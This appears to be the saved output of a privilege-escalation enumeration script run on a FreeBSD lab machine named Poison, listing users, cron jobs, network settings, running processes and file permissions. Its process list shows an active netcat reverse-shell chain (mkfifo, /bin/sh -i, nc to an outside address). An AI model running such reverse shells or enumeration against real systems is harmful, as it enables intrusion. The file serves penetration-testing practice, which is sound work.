@@ -1,0 +1,588 @@
+
+[00;31m#########################################################[00m
+[00;31m#[00m [00;33mLocal Linux Enumeration & Privilege Escalation Script[00m [00;31m#[00m
+[00;31m#########################################################[00m
+[00;33m# www.rebootuser.com[00m
+[00;33m# [00m
+
+Debug Info
+report name = filo.out-30-08-18
+thorough tests = disabled
+
+
+Thu Aug 30 14:24:07 CEST 2018
+[00m
+
+[00;33m### SYSTEM ##############################################[00m
+[00;31mKernel information:[00m
+FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017     root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC  amd64
+
+
+[00;31mHostname:[00m
+Poison
+
+
+[00;33m### USER/GROUP ##########################################[00m
+[00;31mCurrent user/group info:[00m
+uid=1001(charix) gid=1001(charix) groups=1001(charix)
+
+
+[00;31mAll users and uid/gid info:[00m
+# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
+#
+root:*:0:0
+toor:*:0:0
+daemon:*:1:1
+operator:*:2:5
+bin:*:3:7
+tty:*:4:65533
+kmem:*:5:65533
+games:*:7:13
+news:*:8:8
+man:*:9:9
+sshd:*:22:22
+smmsp:*:25:25
+mailnull:*:26:26
+bind:*:53:53
+unbound:*:59:59
+proxy:*:62:62
+_pflogd:*:64:64
+_dhcp:*:65:65
+uucp:*:66:66
+pop:*:68:6
+auditdistd:*:78:77
+www:*:80:80
+_ypldap:*:160:160
+hast:*:845:845
+nobody:*:65534:65534
+_tss:*:601:601
+messagebus:*:556:556
+avahi:*:558:558
+cups:*:193:193
+charix:*:1001:1001
+
+
+[00;31mGroup memberships:[00m
+uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
+uid=0(toor) gid=0(wheel) groups=0(wheel)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(operator) gid=5(operator) groups=5(operator)
+uid=3(bin) gid=7(bin) groups=7(bin)
+uid=4(tty) gid=65533(nogroup) groups=65533(nogroup)
+uid=5(kmem) gid=65533(nogroup) groups=65533(nogroup)
+uid=7(games) gid=13(games) groups=13(games)
+uid=8(news) gid=8(news) groups=8(news)
+uid=9(man) gid=9(man) groups=9(man)
+uid=22(sshd) gid=22(sshd) groups=22(sshd)
+uid=25(smmsp) gid=25(smmsp) groups=25(smmsp)
+uid=26(mailnull) gid=26(mailnull) groups=26(mailnull)
+uid=53(bind) gid=53(bind) groups=53(bind)
+uid=59(unbound) gid=59(unbound) groups=59(unbound)
+uid=62(proxy) gid=62(proxy) groups=62(proxy)
+uid=64(_pflogd) gid=64(_pflogd) groups=64(_pflogd)
+uid=65(_dhcp) gid=65(_dhcp) groups=65(_dhcp)
+uid=66(uucp) gid=66(uucp) groups=66(uucp)
+uid=68(pop) gid=6(mail) groups=6(mail)
+uid=78(auditdistd) gid=77(audit) groups=77(audit)
+uid=80(www) gid=80(www) groups=80(www)
+uid=160(_ypldap) gid=160(_ypldap) groups=160(_ypldap)
+uid=845(hast) gid=845(hast) groups=845(hast)
+uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
+uid=601(_tss) gid=601(_tss) groups=601(_tss)
+uid=556(messagebus) gid=556(messagebus) groups=556(messagebus)
+uid=558(avahi) gid=558(avahi) groups=558(avahi)
+uid=193(cups) gid=193(cups) groups=193(cups)
+uid=1001(charix) gid=1001(charix) groups=1001(charix)
+
+
+[00;33mIt looks like we have password hashes in /etc/passwd![00m
+# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
+#
+root:*:0:0:Charlie &:/root:/bin/csh
+toor:*:0:0:Bourne-again Superuser:/root:
+daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
+operator:*:2:5:System &:/:/usr/sbin/nologin
+bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
+tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
+kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
+games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
+news:*:8:8:News Subsystem:/:/usr/sbin/nologin
+man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
+sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
+smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
+mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
+bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
+unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
+proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
+_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
+_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
+uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
+pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
+auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
+www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
+_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
+hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
+nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
+_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
+messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
+avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
+cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
+charix:*:1001:1001:charix:/home/charix:/bin/csh
+
+
+[00;31mSample entires from /etc/passwd (searching for uid values 0, 500, 501, 502, 1000, 1001, 1002, 2000, 2001, 2002):[00m
+root:*:0:0:Charlie &:/root:/bin/csh
+toor:*:0:0:Bourne-again Superuser:/root:
+charix:*:1001:1001:charix:/home/charix:/bin/csh
+
+
+[00;31mSuper user account(s):[00m
+root
+toor
+
+
+[00;33m***We can read root's home directory![00m
+total 0
+
+
+[00;31mAre permissions on /home directories lax:[00m
+total 12
+drwxr-xr-x   3 root    wheel    512B Mar 19 16:08 .
+drwxr-xr-x  20 root    wheel    1.0K Aug 30 13:58 ..
+drwxr-x---   4 charix  charix   512B Aug 30 14:22 charix
+
+
+[00;31mRoot is allowed to login via SSH:[00m
+PermitRootLogin yes
+
+
+[00;33m### ENVIRONMENTAL #######################################[00m
+[00;31mPath information:[00m
+/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin:/home/charix/bin
+
+
+[00;31mAvailable shells:[00m
+# $FreeBSD: releng/11.1/etc/shells 59717 2000-04-27 21:58:46Z ache $
+#
+# List of acceptable shells for chpass(1).
+# Ftpd will not allow users to connect who are not using
+# one of these shells.
+
+/bin/sh
+/bin/csh
+/bin/tcsh
+
+
+[00;31mCurrent umask value:[00m
+0022
+u=rwx,g=rx,o=rx
+
+
+[00;33m### JOBS/TASKS ##########################################[00m
+[00;31mCron jobs:[00m
+-rw-r--r--  1 root  wheel  730 Jul 21  2017 /etc/crontab
+
+/etc/cron.d:
+total 8
+drwxr-xr-x   2 root  wheel   512 Jul 21  2017 .
+drwxr-xr-x  27 root  wheel  2560 Mar 19 16:21 ..
+
+
+[00;31mCrontab contents:[00m
+# /etc/crontab - root's crontab for FreeBSD
+#
+# $FreeBSD: releng/11.1/etc/crontab 194170 2009-06-14 06:37:19Z brian $
+#
+SHELL=/bin/sh
+PATH=/etc:/bin:/sbin:/usr/bin:/usr/sbin
+#
+#minute	hour	mday	month	wday	who	command
+#
+*/5	*	*	*	*	root	/usr/libexec/atrun
+#
+# Save some entropy so that /dev/random can re-seed on boot.
+*/11	*	*	*	*	operator /usr/libexec/save-entropy
+#
+# Rotate log files every hour, if necessary.
+0	*	*	*	*	root	newsyslog
+#
+# Perform daily/weekly/monthly maintenance.
+1	3	*	*	*	root	periodic daily
+15	4	*	*	6	root	periodic weekly
+30	5	1	*	*	root	periodic monthly
+#
+# Adjust the time zone if the CMOS clock keeps local time, as opposed to
+# UTC time.  See adjkerntz(8) for details.
+1,31	0-5	*	*	*	root	adjkerntz -a
+
+
+[00;33m### NETWORKING  ##########################################[00m
+[00;31mNetwork & IP info:[00m
+le0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> metric 0 mtu 1500
+	options=8<VLAN_MTU>
+	ether 00:50:56:b9:48:3a
+	hwaddr 00:50:56:b9:48:3a
+	inet 10.10.10.84 netmask 0xffffff00 broadcast 10.10.10.255 
+	nd6 options=29<PERFORMNUD,IFDISABLED,AUTO_LINKLOCAL>
+	media: Ethernet autoselect
+	status: active
+lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> metric 0 mtu 16384
+	options=600003<RXCSUM,TXCSUM,RXCSUM_IPV6,TXCSUM_IPV6>
+	inet6 ::1 prefixlen 128 
+	inet6 fe80::1%lo0 prefixlen 64 scopeid 0x2 
+	inet 127.0.0.1 netmask 0xff000000 
+	nd6 options=21<PERFORMNUD,AUTO_LINKLOCAL>
+	groups: lo 
+
+
+[00;31mNameserver(s):[00m
+nameserver 8.8.8.8
+
+
+[00;33m### SERVICES #############################################[00m
+[00;31mRunning processes:[00m
+USER    PID %CPU %MEM    VSZ   RSS TT  STAT STARTED     TIME COMMAND
+root     11 88.0  0.0      0    16  -  RL   13:58   24:51.07 [idle]
+root     12  0.5  0.1      0   736  -  WL   13:58    0:07.23 [intr]
+charix 1350  0.2  0.3  13180  2720 15  S+   14:24    0:00.03 /bin/sh ./filo.sh -r filo.out
+root      0  0.0  0.0      0   160  -  DLs  13:58    0:00.01 [kernel]
+root      1  0.0  0.1   5408  1040  -  SLs  13:58    0:00.01 /sbin/init --
+root      2  0.0  0.0      0    16  -  DL   13:58    0:00.00 [crypto]
+root      3  0.0  0.0      0    16  -  DL   13:58    0:00.00 [crypto returns]
+root      4  0.0  0.0      0    32  -  DL   13:58    0:00.33 [cam]
+root      5  0.0  0.0      0    16  -  DL   13:58    0:00.00 [mpt_recovery0]
+root      6  0.0  0.0      0    16  -  DL   13:58    0:00.00 [sctp_iterator]
+root      7  0.0  0.0      0    16  -  DL   13:58    0:00.47 [rand_harvestq]
+root      8  0.0  0.0      0    16  -  DL   13:58    0:00.00 [soaiod1]
+root      9  0.0  0.0      0    16  -  DL   13:58    0:00.00 [soaiod2]
+root     10  0.0  0.0      0    16  -  DL   13:58    0:00.00 [audit]
+root     13  0.0  0.0      0    48  -  DL   13:58    0:00.01 [geom]
+root     14  0.0  0.0      0   160  -  DL   13:58    0:00.11 [usb]
+root     15  0.0  0.0      0    16  -  DL   13:58    0:00.00 [soaiod3]
+root     16  0.0  0.0      0    16  -  DL   13:58    0:00.00 [soaiod4]
+root     17  0.0  0.0      0    48  -  DL   13:58    0:00.06 [pagedaemon]
+root     18  0.0  0.0      0    16  -  DL   13:58    0:00.00 [vmdaemon]
+root     19  0.0  0.0      0    16  -  DL   13:58    0:00.00 [pagezero]
+root     20  0.0  0.0      0    32  -  DL   13:58    0:00.04 [bufdaemon]
+root     21  0.0  0.0      0    16  -  DL   13:58    0:00.01 [bufspacedaemon]
+root     22  0.0  0.0      0    16  -  DL   13:58    0:00.58 [syncer]
+root     23  0.0  0.0      0    16  -  DL   13:58    0:00.12 [vnlru]
+root    319  0.0  0.5   9560  5052  -  Ss   13:58    0:00.13 /sbin/devd
+root    390  0.0  0.2  10500  2396  -  Ss   13:58    0:00.06 /usr/sbin/syslogd -s
+root    543  0.0  0.5  56320  5396  -  S    13:58    0:01.13 /usr/local/bin/vmtoolsd -c /usr/local/sh
+root    620  0.0  0.7  57812  7052  -  Is   13:58    0:00.10 /usr/sbin/sshd
+root    624  0.0  0.8  85228  7704  -  Is   13:59    0:00.03 sshd: charix [priv] (sshd)
+root    626  0.0  0.8  85228  7768  -  Is   13:59    0:00.02 sshd: charix [priv] (sshd)
+root    632  0.0  0.8  85228  7768  -  Is   13:59    0:00.02 sshd: charix [priv] (sshd)
+charix  634  0.0  0.8  85228  7852  -  I    13:59    0:00.05 sshd: charix@pts/1 (sshd)
+charix  646  0.0  0.8  85228  7784  -  I    13:59    0:00.02 sshd: charix@pts/2 (sshd)
+charix  661  0.0  0.8  85228  7824  -  I    13:59    0:00.03 sshd: charix@pts/3 (sshd)
+root    668  0.0  1.1  99172 11516  -  Ss   13:59    0:00.07 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www     713  0.0  1.2 101220 12352  -  I    14:00    0:00.39 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www     714  0.0  1.2 101220 12152  -  I    14:00    0:00.45 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www     715  0.0  1.2 101220 11940  -  I    14:00    0:00.01 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www     716  0.0  1.2 101220 11924  -  I    14:00    0:00.37 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www     717  0.0  1.2 101220 12148  -  I    14:00    0:00.39 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www     719  0.0  1.2 101220 12180  -  I    14:00    0:00.53 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www     720  0.0  1.2  99172 11852  -  I    14:00    0:00.46 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www     723  0.0  1.6 103268 15836  -  S    14:00    0:05.20 /usr/local/sbin/httpd -DNOHTTPACCEPT
+root    744  0.0  0.6  20636  6204  -  Ss   14:00    0:00.03 sendmail: accepting connections (sendmai
+root    747  0.0  0.8  85228  7836  -  Is   14:00    0:00.02 sshd: charix [priv] (sshd)
+www     751  0.0  0.3  13180  2664  -  I    14:00    0:00.00 sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f
+www     754  0.0  0.2   8324  1932  -  S    14:00    0:00.00 cat /tmp/f
+www     755  0.0  0.3  13180  2688  -  S    14:00    0:00.01 /bin/sh -i
+www     756  0.0  0.2  10928  2004  -  S    14:00    0:00.01 nc 10.10.15.206 5555
+root    781  0.0  0.8  85228  7832  -  Is   14:01    0:00.02 sshd: charix [priv] (sshd)
+smmsp   783  0.0  0.6  20636  6000  -  Is   14:01    0:00.00 sendmail: Queue runner@00:30:00 for /var
+root    787  0.0  0.2  12592  2436  -  Ss   14:01    0:00.01 /usr/sbin/cron -s
+charix  852  0.0  0.8  85228  7936  -  I    14:01    0:00.15 sshd: charix@pts/6 (sshd)
+charix  862  0.0  0.8  85228  7852  -  I    14:01    0:00.01 sshd: charix@pts/7 (sshd)
+www     894  0.0  1.2 101220 12104  -  I    14:02    0:00.40 /usr/local/sbin/httpd -DNOHTTPACCEPT
+root    941  0.0  0.8  85228  7832  -  Is   14:05    0:00.02 sshd: charix [priv] (sshd)
+charix  949  0.0  0.8  85228  7896  -  I    14:06    0:00.04 sshd: charix@pts/9 (sshd)
+www     975  0.0  1.2  99172 11916  -  I    14:08    0:00.24 /usr/local/sbin/httpd -DNOHTTPACCEPT
+root   1007  0.0  0.8  85228  7832  -  Is   14:09    0:00.02 sshd: charix [priv] (sshd)
+root   1010  0.0  0.8  85228  7832  -  Is   14:09    0:00.02 sshd: charix [priv] (sshd)
+charix 1015  0.0  0.8  85228  7852  -  I    14:09    0:00.01 sshd: charix@pts/4 (sshd)
+charix 1042  0.0  0.8  85228  7860  -  I    14:09    0:00.01 sshd: charix@pts/5 (sshd)
+www    1088  0.0  1.2 101220 11928  -  S    14:11    0:00.09 /usr/local/sbin/httpd -DNOHTTPACCEPT
+root   1142  0.0  0.8  85228  7832  -  Is   14:13    0:00.02 sshd: charix [priv] (sshd)
+charix 1148  0.0  0.8  85228  7892  -  I    14:13    0:00.03 sshd: charix@pts/11 (sshd)
+root   1167  0.0  0.8  85228  7832  -  Is   14:14    0:00.03 sshd: charix [priv] (sshd)
+charix 1174  0.0  0.8  85228  7892  -  I    14:14    0:00.04 sshd: charix@pts/13 (sshd)
+root   1220  0.0  0.8  85228  7832  -  Is   14:16    0:00.02 sshd: charix [priv] (sshd)
+charix 1226  0.0  0.8  85228  7852  -  I    14:17    0:00.02 sshd: charix@pts/14 (sshd)
+root   1247  0.0  0.8  85228  7832  -  Is   14:19    0:00.02 sshd: charix [priv] (sshd)
+charix 1253  0.0  0.8  85228  7908  -  S    14:19    0:00.05 sshd: charix@pts/15 (sshd)
+root   1343  0.0  0.8  84012  7708  -  Is   14:22    0:00.02 sshd: charix [priv] (sshd)
+sshd   1344  0.0  0.7  61264  7436  -  I    14:22    0:00.01 sshd: charix [net] (sshd)
+root   1345  0.0  0.8  84012  7708  -  I    14:23    0:00.00 sshd: charix [pam] (sshd)
+root    529  0.0  0.9  23608  9024 v0- I    13:58    0:00.23 Xvnc :1 -desktop X -httpd /usr/local/sha
+root    541  0.0  0.5  37620  5316 v0- I    13:58    0:00.02 twm
+root    834  0.0  0.2  10484  2076 v0  Is+  14:01    0:00.00 /usr/libexec/getty Pc ttyv0
+root    835  0.0  0.2  10484  2076 v1  Is+  14:01    0:00.00 /usr/libexec/getty Pc ttyv1
+root    836  0.0  0.2  10484  2076 v2  Is+  14:01    0:00.00 /usr/libexec/getty Pc ttyv2
+root    837  0.0  0.2  10484  2076 v3  Is+  14:01    0:00.00 /usr/libexec/getty Pc ttyv3
+root    838  0.0  0.2  10484  2076 v4  Is+  14:01    0:00.00 /usr/libexec/getty Pc ttyv4
+root    839  0.0  0.2  10484  2076 v5  Is+  14:01    0:00.00 /usr/libexec/getty Pc ttyv5
+root    840  0.0  0.2  10484  2076 v6  Is+  14:01    0:00.00 /usr/libexec/getty Pc ttyv6
+root    841  0.0  0.2  10484  2076 v7  Is+  14:01    0:00.00 /usr/libexec/getty Pc ttyv7
+charix  635  0.0  0.4  19660  3644  1  Is+  13:59    0:00.07 -csh (csh)
+charix  647  0.0  0.4  19660  3628  2  Is+  13:59    0:00.02 -csh (csh)
+charix  662  0.0  0.4  19660  3628  3  Is+  13:59    0:00.02 -csh (csh)
+charix 1016  0.0  0.4  19660  3656  4  Is+  14:09    0:00.01 -csh (csh)
+charix 1054  0.0  0.9  24740  8928  4  S    14:10    0:07.87 Xvnc :2 -desktop X -httpd /usr/local/sha
+charix 1062  0.0  0.7  67220  7196  4  S    14:10    0:00.12 xterm -geometry 80x24+10+10 -ls -title X
+charix 1063  0.0  0.5  37620  5344  4  I    14:10    0:00.03 twm
+charix 1043  0.0  0.4  19660  3624  5  Is+  14:09    0:00.01 -csh (csh)
+charix  853  0.0  0.4  19660  3832  6  Is+  14:01    0:00.08 -csh (csh)
+charix  863  0.0  0.4  19660  3656  7  Is+  14:01    0:00.01 -csh (csh)
+charix 1065  0.0  0.4  19660  3644  8  Ss+  14:10    0:00.03 -csh (csh)
+charix  950  0.0  0.4  19660  3628  9  Is+  14:06    0:00.03 -csh (csh)
+charix 1127  0.0  0.8  22692  8068  9  I    14:12    0:00.04 Xvnc :3 -desktop X -httpd /usr/local/sha
+charix 1134  0.0  0.7  67220  7144  9  I    14:12    0:00.02 xterm -geometry 80x24+10+10 -ls -title X
+charix 1135  0.0  0.5  37620  5328  9  I    14:12    0:00.01 twm
+charix 1137  0.0  0.4  19660  3640 10  Is+  14:12    0:00.01 -csh (csh)
+charix 1149  0.0  0.4  19660  3624 11  Is+  14:13    0:00.02 -csh (csh)
+charix 1175  0.0  0.4  19660  3776 13  Is+  14:14    0:00.05 -csh (csh)
+charix 1227  0.0  0.4  19660  3612 14  Is+  14:17    0:00.02 -csh (csh)
+charix 1254  0.0  0.4  19660  3640 15  Ss   14:19    0:00.03 -csh (csh)
+charix 1604  0.0  0.3  21208  2712 15  R+   14:24    0:00.00 ps aux
+
+
+[00;31mProcess binaries & associated permissions (from above list):[00m
+-r-xr-xr-x  1 root  wheel   161936 Jul 21  2017 /bin/sh
+-r-xr-xr-x  1 root  wheel  1203224 Jul 21  2017 /sbin/devd
+-r-xr-xr-x  1 root  wheel  1081600 Jul 21  2017 /sbin/init
+-r-xr-xr-x  1 root  wheel    31008 Jul 21  2017 /usr/libexec/getty
+-rwxr-xr-x  1 root  wheel    42792 Mar 16 00:26 /usr/local/bin/vmtoolsd
+-rwxr-xr-x  1 root  wheel   788153 Jan  2  2018 /usr/local/sbin/httpd
+-r-xr-xr-x  1 root  wheel    45304 Jul 21  2017 /usr/sbin/cron
+-r-xr-xr-x  1 root  wheel   313112 Jul 21  2017 /usr/sbin/sshd
+-r-xr-xr-x  1 root  wheel    45296 Jul 21  2017 /usr/sbin/syslogd
+
+
+[00;31mContents of /etc/inetd.conf:[00m
+# $FreeBSD: releng/11.1/etc/inetd.conf 285253 2015-07-07 20:15:09Z hrs $
+#
+# Internet server configuration database
+#
+# Define *both* IPv4 and IPv6 entries for dual-stack support.
+# To disable a service, comment it out by prefixing the line with '#'.
+# To enable a service, remove the '#' at the beginning of the line.
+#
+#ftp	stream	tcp	nowait	root	/usr/libexec/ftpd	ftpd -l
+#ftp	stream	tcp6	nowait	root	/usr/libexec/ftpd	ftpd -l
+#ssh	stream	tcp	nowait	root	/usr/sbin/sshd		sshd -i -4
+#ssh	stream	tcp6	nowait	root	/usr/sbin/sshd		sshd -i -6
+#telnet	stream	tcp	nowait	root	/usr/libexec/telnetd	telnetd
+#telnet	stream	tcp6	nowait	root	/usr/libexec/telnetd	telnetd
+#shell	stream	tcp	nowait	root	/usr/libexec/rshd	rshd
+#shell	stream	tcp6	nowait	root	/usr/libexec/rshd	rshd
+#login	stream	tcp	nowait	root	/usr/libexec/rlogind	rlogind
+#login	stream	tcp6	nowait	root	/usr/libexec/rlogind	rlogind
+#finger	stream	tcp	nowait/3/10 nobody /usr/libexec/fingerd	fingerd -k -s
+#finger	stream	tcp6	nowait/3/10 nobody /usr/libexec/fingerd	fingerd -k -s
+#
+# run comsat as root to be able to print partial mailbox contents w/ biff,
+# or use the safer tty:tty to just print that new mail has been received.
+#comsat	dgram	udp	wait	tty:tty	/usr/libexec/comsat	comsat
+#
+# ntalk is required for the 'talk' utility to work correctly
+#ntalk	dgram	udp	wait	tty:tty	/usr/libexec/ntalkd	ntalkd
+#tftp	dgram	udp	wait	root	/usr/libexec/tftpd	tftpd -l -s /tftpboot
+#tftp	dgram	udp6	wait	root	/usr/libexec/tftpd	tftpd -l -s /tftpboot
+#bootps	dgram	udp	wait	root	/usr/libexec/bootpd	bootpd
+#
+# "Small servers" -- used to be standard on, but we're more conservative
+# about things due to Internet security concerns.  Only turn on what you
+# need.
+#
+#daytime stream	tcp	nowait	root	internal
+#daytime stream	tcp6	nowait	root	internal
+#daytime dgram	udp	wait	root	internal
+#daytime dgram	udp6	wait	root	internal
+#time	stream	tcp	nowait	root	internal
+#time	stream	tcp6	nowait	root	internal
+#time	 dgram	udp	wait	root	internal
+#time	 dgram	udp6	wait	root	internal
+#echo	stream	tcp	nowait	root	internal
+#echo	stream	tcp6	nowait	root	internal
+#echo	dgram	udp	wait	root	internal
+#echo	dgram	udp6	wait	root	internal
+#discard stream	tcp	nowait	root	internal
+#discard stream	tcp6	nowait	root	internal
+#discard dgram	udp	wait	root	internal
+#discard dgram	udp6	wait	root	internal
+#chargen stream	tcp	nowait	root	internal
+#chargen stream	tcp6	nowait	root	internal
+#chargen dgram	udp	wait	root	internal
+#chargen dgram	udp6	wait	root	internal
+#
+# CVS servers - for master CVS repositories only!  You must set the
+# --allow-root path correctly or you open a trivial to exploit but
+# deadly security hole.
+#
+#cvspserver	stream	tcp	nowait	root	/usr/local/bin/cvs	cvs --allow-root=/your/cvsroot/here pserver
+#cvspserver	stream	tcp	nowait	root	/usr/local/bin/cvs	cvs --allow-root=/your/cvsroot/here kserver
+#
+# RPC based services (you MUST have rpcbind running to use these)
+#
+#rstatd/1-3	dgram rpc/udp wait root	/usr/libexec/rpc.rstatd	 rpc.rstatd
+#rusersd/1-2	dgram rpc/udp wait root	/usr/libexec/rpc.rusersd rpc.rusersd
+#walld/1	dgram rpc/udp wait root	/usr/libexec/rpc.rwalld	 rpc.rwalld
+#pcnfsd/1-2	dgram rpc/udp wait root	/usr/local/libexec/rpc.pcnfsd	 rpc.pcnfsd
+#rquotad/1	dgram rpc/udp wait root	/usr/libexec/rpc.rquotad rpc.rquotad
+#rquotad/1	dgram rpc/udp6 wait root	/usr/libexec/rpc.rquotad rpc.rquotad
+#sprayd/1	dgram rpc/udp wait root	/usr/libexec/rpc.sprayd	 rpc.sprayd
+#
+# example entry for the optional pop3 server
+#
+#pop3	stream	tcp	nowait	root	/usr/local/libexec/popper	popper
+#
+# example entry for the optional imap4 server
+#
+#imap4	stream	tcp	nowait	root	/usr/local/libexec/imapd	imapd
+#
+# example entry for the optional nntp server
+#
+#nntp	stream	tcp	nowait	news	/usr/local/libexec/nntpd	nntpd
+#
+# example entry for the optional uucpd server
+#
+#uucpd	stream	tcp	nowait	root	/usr/local/libexec/uucpd	uucpd
+#
+# Return error for all "ident" requests
+#
+#auth	stream	tcp	nowait	root	internal
+#auth	stream	tcp6	nowait	root	internal
+#
+# Provide internally a real "ident" service which provides ~/.fakeid support,
+# provides ~/.noident support, reports UNKNOWN as the operating system type
+# and times out after 30 seconds.
+#
+#auth	stream	tcp	nowait	root	internal	auth -r -f -n -o UNKNOWN -t 30
+#auth	stream	tcp6	nowait	root	internal	auth -r -f -n -o UNKNOWN -t 30
+#
+# Example entry for an external ident server
+#
+#auth	stream	tcp	wait	root	/usr/local/sbin/identd	identd -w -t120
+#
+# Example entry for the optional qmail MTA
+#  NOTE: This is no longer the correct way to handle incoming SMTP
+#        connections for qmail.  Use tcpserver (http://cr.yp.to/ucspi-tcp.html)
+#        instead.
+#
+#smtp	stream	tcp	nowait	qmaild	/var/qmail/bin/tcp-env	tcp-env /var/qmail/bin/qmail-smtpd
+#
+# Enable the following two entries to enable samba startup from inetd
+# (from the Samba documentation).  Enable the third entry to enable the swat
+# samba configuration tool.
+#
+#netbios-ssn stream tcp	nowait		root	/usr/local/sbin/smbd	smbd
+#netbios-ns dgram udp	wait		root	/usr/local/sbin/nmbd	nmbd
+#swat	stream	tcp	nowait/400	root	/usr/local/sbin/swat	swat
+
+
+[00;31m/usr/local/etc/rc.d binary permissions:[00m
+total 60
+drwxr-xr-x   2 root  wheel   512 Mar 19 13:14 .
+drwxr-xr-x  18 root  wheel  1024 Jan 24  2018 ..
+-r-xr-xr-x   1 root  wheel  6230 Jan  2  2018 apache24
+-r-xr-xr-x   1 root  wheel   881 Jan  2  2018 avahi-daemon
+-r-xr-xr-x   1 root  wheel  1129 Jan  2  2018 avahi-dnsconfd
+-r-xr-xr-x   1 root  wheel   539 Jan 20  2018 cupsd
+-r-xr-xr-x   1 root  wheel   796 Jan  2  2018 dbus
+-r-xr-xr-x   1 root  wheel  1834 Jan  2  2018 htcacheclean
+-r-xr-xr-x   1 root  wheel  1061 Jan  2  2018 php-fpm
+-r-xr-xr-x   1 root  wheel  1239 Jan 20  2018 tcsd
+-r-xr-xr-x   1 root  wheel   628 Jan  2  2018 tpmd
+-r-xr-xr-x   1 root  wheel   905 Mar 16 00:26 vmware-guestd
+-r-xr-xr-x   1 root  wheel  2148 Mar 16 00:26 vmware-kmod
+-r-xr-xr-x   1 root  wheel  1035 Jan 24  2018 vncserver
+
+
+[00;33m### SOFTWARE #############################################[00m
+[00;31mApache version:[00m
+Server version: Apache/2.4.29 (FreeBSD)
+Server built:   unknown
+
+
+[00;33m### INTERESTING FILES ####################################[00m
+[00;31mUseful file locations:[00m
+/usr/bin/nc
+/usr/local/bin/wget
+
+
+[00;31mCan we read/write sensitive files:[00m
+-rw-r--r--  1 root  wheel  1894 Mar 19 16:21 /etc/passwd
+-rw-r--r--  1 root  wheel  546 Mar 19 16:08 /etc/group
+-rw-------  1 root  wheel  2260 Mar 19 16:21 /etc/master.passwd
+
+
+[00;31mrhost config file(s) and file contents:[00m
+-rw-r-----  1 charix  charix  281 Mar 19 16:08 /home/charix/.rhosts
+# $FreeBSD: releng/11.1/share/skel/dot.rhosts 50476 1999-08-28 00:22:10Z peter $
+#
+# .rhosts - trusted remote host name and user data base
+#
+# see hosts.equiv(5), rsh(1), rlogin(1), rcp(1)
+#
+# This file should NOT be group or other readable.
+# OtherMachine
+# OtherMachine myFriend
+
+
+[00;31mHosts.equiv file details and file contents: [00m
+-rw-r--r--  1 root  wheel  116 Jul 21  2017 /etc/hosts.equiv
+# $FreeBSD: releng/11.1/etc/hosts.equiv 50472 1999-08-27 23:37:10Z peter $
+#
+#localhost
+#my_very_good_friend.domain
+
+
+Can't search *.conf files as no keyword was entered
+
+Can't search *.log files as no keyword was entered
+
+Can't search *.ini files as no keyword was entered
+
+[00;31mAll *.conf files in /etc (recursive 1 level):[00m
+-rw-r--r--  1 root  wheel  338 Jul 21  2017 /etc/nsswitch.conf
+-rw-r--r--  1 root  wheel  5097 Jul 21  2017 /etc/inetd.conf
+-rw-r--r--  1 root  wheel  458 Jul 21  2017 /etc/blacklistd.conf
+-rw-r--r--  1 root  wheel  295 Jul 21  2017 /etc/nscd.conf
+-rw-r--r--  1 root  wheel  1552 Jul 21  2017 /etc/syslog.conf
+-rw-r--r--  1 root  wheel  1240 Jul 21  2017 /etc/apmd.conf
+-rw-r--r--  1 root  wheel  1993 Jul 21  2017 /etc/devfs.conf
+-rw-r--r--  1 root  wheel  567 Jul 21  2017 /etc/ddb.conf
+-rw-r--r--  1 root  wheel  2894 Jul 21  2017 /etc/freebsd-update.conf
+-rw-r--r--  1 root  wheel  272 Jul 21  2017 /etc/dhclient.conf
+-rw-r--r--  1 root  wheel  10224 Jul 21  2017 /etc/devd.conf
